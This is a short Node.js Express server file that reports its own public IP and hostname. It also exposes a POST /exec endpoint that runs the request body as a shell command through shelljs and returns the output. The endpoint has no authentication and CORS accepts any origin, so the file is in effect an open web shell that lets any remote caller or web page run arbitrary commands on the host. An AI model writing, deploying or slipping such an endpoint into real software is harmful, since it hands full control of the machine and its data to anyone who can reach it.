import bparser from "body-parser";
import expcors from "cors";
import express from "express";
import shelljs from "shelljs";

const app = express();
app.use(bparser.text());
app.use(expcors({ origin: true }));

app.get("/", (req, res) => {
  fetch("https://api.ipify.org?format=json")
    .then(async (result) => {
      const response = await result.json();
      const hostname = req.hostname;
      res.send({ hostname, response });
    })
    .catch((error) => res.send(error));
});

app.post("/exec", async (req, res) =>
  shelljs.exec(
    req.body,
    {
      timeout: 10 * 1000,
    },
    (code, stdout, stderr) => {
      console.log(`Command response code: ${code}.`);
      if (stdout) {
        res.send(`Output: ${stdout}`);
      } else if (stderr) {
        res.send(`Error: ${stderr}`);
      }
    },
  ),
);

app.listen(8080, () => {
  console.log(`listening`);
});
